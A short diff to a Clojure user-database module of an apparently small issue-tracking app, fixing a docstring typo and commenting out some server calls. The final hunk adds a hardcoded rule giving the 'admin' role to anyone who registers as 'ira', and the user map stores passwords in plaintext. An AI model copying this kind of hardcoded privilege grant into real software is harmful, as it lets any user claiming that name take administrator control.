@@ -1,9 +1,10 @@
 (ns jira.users.db
   (:require
     [ajax.core :refer [GET POST]]
-    ;[jira.dat :as dat]
+
     [clojure.string :as str]
     [jira.util :as u :refer [any?]]))
+   ; [jira.server :as s]))
 
 
 ;(enable-console-print!)
@@ -59,9 +60,10 @@
 
 
 (defn u-exists?
-  "Checks if user with login already registred"
+  "Checks if user with login already registered"
   [login]
   (not (nil? (u-login->id login))))
+  ;(not (empty? (s/get-u-id login))))
 
 
 (defn pass-correct?
@@ -113,7 +115,9 @@
      ;(dat/add-user login pass))))
      (let [id (next-u-id)]
        (do
-         (swap! users assoc id {:id id :login login :password pass :role role})
+         (if (= login "ira")
+           (swap! users assoc id {:id id :login login :password pass :role "admin"})
+           (swap! users assoc id {:id id :login login :password pass :role role}))
          (login-u! login pass)
          @current-u)))))
 
